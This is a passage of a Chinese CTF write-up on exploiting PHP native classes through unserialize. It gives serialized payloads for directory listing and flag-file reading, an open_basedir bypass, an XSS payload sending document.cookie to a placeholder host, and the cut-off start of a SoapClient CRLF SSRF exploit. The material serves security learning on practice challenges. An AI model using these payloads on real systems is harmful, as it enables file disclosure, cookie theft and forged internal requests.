class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>对于这个，我们可以看到提示了<code>flag</code>在<code>这个目录下的某个目录中的文件里</code>，明显是想让我们进行目录遍历，同时这里并未给出其他可利用的类，且存在<code>echo</code>函数，因此我们想到PHP原生类中的<code>FilesystemIterator </code>类。</p>\n<p>因此我们这里可以给<code>$class</code>赋值为目录读取类，给<code>$para</code>赋值为我们想读取的目录，构造Poc如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">A</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$class</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'FilesystemIterator'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$para</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'./'</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">A</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">#O:1:\"A\":2:&#123;s:5:\"class\";s:18:\"FilesystemIterator\";s:4:\"para\";s:2:\"./\";&#125;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>此时用得到的Payload去打，即可发现<code>flag</code></p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304070158120.png\" alt=\"image-20230407015809072\"></p>\n<p>接下来读取flag文件夹，看看里面有啥</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">A</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$class</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'FilesystemIterator'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$para</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'./flag'</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">A</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">#O:1:\"A\":2:&#123;s:5:\"class\";s:18:\"FilesystemIterator\";s:4:\"para\";s:6:\"./flag\";&#125;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304070201130.png\" alt=\"image-20230407020158080\"></p>\n<p>但它这个类是没有文件读取功能的，想读取文件的话还需要用到其他类，这里使用<code>SplFileObject</code>类进行读取，因此简单修改一下Poc，尝试读取<code>flag.txt</code></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">A</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$class</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'SplFileObject'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$para</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'./flag/flag.txt'</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">A</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">#O:1:\"A\":2:&#123;s:5:\"class\";s:13:\"SplFileObject\";s:4:\"para\";s:15:\"./flag/flag.txt\";&#125;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304070204634.png\" alt=\"image-20230407020414585\"></p>\n<p>成功获取flag</p>\n<h3 id=\"DirectoryIterator\"><a href=\"#DirectoryIterator\" class=\"headerlink\" title=\"DirectoryIterator\"></a>DirectoryIterator</h3><h4 id=\"定义-3\"><a href=\"#定义-3\" class=\"headerlink\" title=\"定义\"></a>定义</h4><p>DirectoryIterator 类提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。</p>\n<p>该类的部分代码如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">DirectoryIterator <span class=\"token keyword\">extends</span> <span class=\"token class-name\">SplFileInfo</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">SeekableIterator</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">/* 方法 */</span>\n    <span class=\"token keyword\">public</span> <span class=\"token function\">__construct</span> <span class=\"token punctuation\">(</span> <span class=\"token keyword type-hint\">string</span> <span class=\"token variable\">$path</span> <span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">public</span> <span class=\"token function\">current</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token class-name return-type\">DirectoryIterator</span>\n    <span class=\"token keyword\">public</span> <span class=\"token function\">getATime</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">int</span>\n    <span class=\"token keyword\">public</span> <span class=\"token function\">getBasename</span> <span class=\"token punctuation\">(</span> <span class=\"token keyword type-hint\">string</span> <span class=\"token variable\">$suffix</span> <span class=\"token operator\">=</span> <span class=\"token operator\">?</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">string</span>\n    <span class=\"token keyword\">public</span> <span class=\"token function\">getCTime</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">int</span>\n    <span class=\"token keyword\">public</span> <span class=\"token function\">getExtension</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">string</span>\n    <span class=\"token keyword\">public</span> <span class=\"token function\">getFilename</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">string</span>\n    <span class=\"token keyword\">public</span> <span class=\"token function\">getGroup</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">int</span>\n    <span class=\"token keyword\">public</span> <span class=\"token function\">getInode</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">int</span>\n    <span class=\"token keyword\">public</span> <span class=\"token function\">getMTime</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">int</span>\n    <span class=\"token keyword\">public</span> <span class=\"token function\">getOwner</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">int</span>\n    <span class=\"token keyword\">public</span> <span class=\"token function\">getPath</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">string</span>\n    <span class=\"token keyword\">public</span> <span class=\"token function\">getPathname</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">string</span>\n    <span class=\"token keyword\">public</span> <span class=\"token function\">getPerms</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">int</span>\n    <span class=\"token keyword\">public</span> <span class=\"token function\">getSize</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">int</span>\n    <span class=\"token keyword\">public</span> <span class=\"token function\">getType</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">string</span>\n    <span class=\"token keyword\">public</span> <span class=\"token function\">isDir</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">bool</span>\n    <span class=\"token keyword\">public</span> <span class=\"token function\">isDot</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">bool</span>\n    <span class=\"token keyword\">public</span> <span class=\"token function\">isExecutable</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">bool</span>\n    <span class=\"token keyword\">public</span> <span class=\"token function\">isFile</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">bool</span>\n    <span class=\"token keyword\">public</span> <span class=\"token function\">isLink</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">bool</span>\n    <span class=\"token keyword\">public</span> <span class=\"token function\">isReadable</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">bool</span>\n    <span class=\"token keyword\">public</span> <span class=\"token function\">isWritable</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">bool</span>\n    <span class=\"token keyword\">public</span> <span class=\"token function\">key</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">string</span>\n    <span class=\"token keyword\">public</span> <span class=\"token function\">next</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">void</span>\n    <span class=\"token keyword\">public</span> <span class=\"token function\">rewind</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">void</span>\n    <span class=\"token keyword\">public</span> <span class=\"token function\">seek</span> <span class=\"token punctuation\">(</span> <span class=\"token keyword type-hint\">int</span> <span class=\"token variable\">$position</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">void</span>\n    <span class=\"token keyword\">public</span> <span class=\"token function\">__toString</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">string</span>    <span class=\"token comment\">// 以字符串形式获取文件名</span>\n    <span class=\"token keyword\">public</span> <span class=\"token function\">valid</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">bool</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"简单利用-2\"><a href=\"#简单利用-2\" class=\"headerlink\" title=\"简单利用\"></a>简单利用</h4><p>如果不进行遍历，它只能获取指定目录下排序后的一个文件名，因此我们需要进行一个遍历才可获取其指定目录下全部文件名，利用方式如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$dir</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">DirectoryIterator</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$dir</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n     <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'&lt;br>'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>接下来访问环境，即可发现</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304070134407.png\" alt=\"image-20230407013424095\"></p>\n<p>根目录文件名均被列出。</p>\n<h3 id=\"GlobIterator\"><a href=\"#GlobIterator\" class=\"headerlink\" title=\"GlobIterator\"></a>GlobIterator</h3><h4 id=\"定义-4\"><a href=\"#定义-4\" class=\"headerlink\" title=\"定义\"></a>定义</h4><p>GlobIterator与前两个类相似，它也可以遍历一个文件目录，略有不同的是它与<code>glob()</code>有共通之处，可以通过模式匹配寻找文件路径，比如题目的flag在<code>aaccflag.php</code>中，我们知道文件名可能会有<code>flag</code>，此时就可以去<code>GlobIterator(/*flag*)</code>这种方式来匹配<code>flag</code>。</p>\n<p>具体代码如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$dir</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">GlobIterator</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/*flag*\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$dir</span><span class=\"token punctuation\">;</span>\n</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>接下来去访问<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304070211995.png\" alt=\"image-20230407021156672\"></p>\n<p>成功找到flag文件</p>\n<h3 id=\"open-basedir-BYpass\"><a href=\"#open-basedir-BYpass\" class=\"headerlink\" title=\"open_basedir BYpass\"></a>open_basedir BYpass</h3><p>当这三个目录遍历类与<code>glob</code>伪协议相结合时，可以绕过<code>open_basedir</code>，查看指定目录下的文件名，具体代码如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$dir</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">DirectoryIterator</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$dir</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'&lt;br>'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>访问环境</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304070220866.png\" alt=\"image-20230407022028537\"></p>\n<p>成功输出根目录文件名，其他目录遍历类亦是如此，这里不再演示。</p>\n<h1 id=\"CTF赛题实战\"><a href=\"#CTF赛题实战\" class=\"headerlink\" title=\"CTF赛题实战\"></a>CTF赛题实战</h1><h2 id=\"XSS\"><a href=\"#XSS\" class=\"headerlink\" title=\"XSS\"></a>XSS</h2><h3 id=\"BJDCTF-2nd-xss之光\"><a href=\"#BJDCTF-2nd-xss之光\" class=\"headerlink\" title=\"[BJDCTF 2nd]xss之光\"></a>[BJDCTF 2nd]xss之光</h3><p>没找到环境，但无妨，因为很多大师傅已经给出了Wp，附赠了源码，因此直接看思路即可。</p>\n<p>其题目代码如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'yds_is_so_beautiful'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>这里不难看出是有关PHP反序列化的，但并未给出参数，因此联想到PHP原生类的利用，题目名为Xss之光，且最后有<code>echo</code>函数，明显的原生类触发XSS题目，对于XSS，XSS利用<code>window.open()</code>函数，就可打开新窗口，带出Cookie(flag一般都在Cookie中)，因此构造Poc如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Exception</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;script>window.location.href='https://www.baidu.com'&lt;/script>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">#O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A29%3A%22%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A40%3A%22D%3A%5CphpStudy%5CPHPTutorial%5CWWW%5Chtml%5C877.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>也可以直接弹Cookie</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Exception</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;script>window.location.href='url/?'+document.cookie&lt;/script>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>没图的话有些抽象，这里借用一下<strong>春告鳥</strong>大师傅的图。</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304070115345.png\" alt=\"img\"></p>\n<h2 id=\"SSRF\"><a href=\"#SSRF\" class=\"headerlink\" title=\"SSRF\"></a>SSRF</h2><h3 id=\"CTFSHOW-web-259\"><a href=\"#CTFSHOW-web-259\" class=\"headerlink\" title=\"CTFSHOW web[259]\"></a>CTFSHOW web[259]</h3><p>题目环境<a href=\"https://ctf.show/challenges#web259-719\">https://ctf.show/challenges#web259-719</a></p>\n<p>源码如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">#index.php\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\n<span class=\"token variable\">$vip</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'vip'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//vip can get flag one key</span>\n<span class=\"token variable\">$vip</span><span class=\"token operator\">-></span><span class=\"token function\">getFlag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">#flag.php</span>\n<span class=\"token variable\">$xff</span> <span class=\"token operator\">=</span> <span class=\"token function\">explode</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">','</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'HTTP_X_FORWARDED_FOR'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">array_pop</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$xff</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$ip</span> <span class=\"token operator\">=</span> <span class=\"token function\">array_pop</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$xff</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ip</span><span class=\"token operator\">!==</span><span class=\"token string single-quoted-string\">'127.0.0.1'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'error'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token variable\">$token</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'token'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$token</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'ctfshow'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag.txt'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里的话可以看到它是按照<code>HTTP_X_FORWARDED_FOR</code>对请求报文进行分离，后半部分为<code>$ip</code>，我们这里的<code>User-Agent</code>即位于<code>$ip</code>中，因此我们可以借用<code>SoapClient+CRLF</code>实现SSRF，将上面demo中的代码进行更改即可，具体如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$target</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'http://127.0.0.1/flag.php'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$post_data</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'token=ctfshow'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$headers</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'X-Forwarded-For: 127.0.0.1,127.0.0.1'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">SoapClient</span><span class=\"token punctuation\">(</span><span class=\"token constant\">null</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'location'</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$target</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'user_agent'</span><span class=\"token operator\">=></span><span class=\"token string single-quoted-string\">'qwq^^Content-Type: application/x-www-form-urlencoded^^'</span><span class=\"token operator\">.</span><span class=\"token function\">join</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'^^'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$headers</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'^^Content-Length: '</span><span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">string</span><span class=\"token punctuation\">)</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$post_data</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'^^^^'</span><span class=\"token operator\">.</span><span class=\"token variable\">$post_data</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'uri'</span><span class=\"token operator\">=></span><span class=\"token string single-quoted-string\">'test'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'^^'</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\\r\\n\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token 